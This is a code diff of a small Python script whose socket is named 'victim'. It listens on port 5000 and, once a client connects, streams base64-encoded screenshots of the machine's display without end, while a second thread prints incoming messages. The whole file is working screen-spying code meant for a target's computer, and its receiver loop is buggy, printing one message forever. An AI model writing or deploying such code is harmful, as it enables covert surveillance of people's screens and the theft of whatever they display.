@@ -1,22 +1,32 @@
 import socket
-import pyautogui
+import pyscreeze
 import base64
 from io import BytesIO
+import time
+import threading
+time.sleep(1)
 
-host = 'local host'
 port = 5000
 victim=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
  
 victim.bind(('', port))
 victim.listen()
 c, addr = victim.accept()
+msg=""
+recieved=""
 print("CONNECTION FROM:", str(addr))
-msg = "sending image file"
-while True:
-    img=pyautogui.screenshot()
-    buffered = BytesIO()
-    img.save(buffered, format="PNG")
-    img_str = base64.b64encode(buffered.getvalue())
-    c.sendall(img_str)
-
-c.close()
+def reciever():
+    recieved=c.recv(1024)
+    while True:
+        print(recieved.decode())
+def sender():
+    while True:
+        img=pyscreeze.screenshot()
+        buffered = BytesIO()
+        img.save(buffered, format="PNG")
+        img_str = base64.b64encode(buffered.getvalue())
+        c.sendall(img_str)
+reciever=threading.Thread(target=reciever)
+reciever.start()
+sender=threading.Thread(target=sender)
+sender.start()
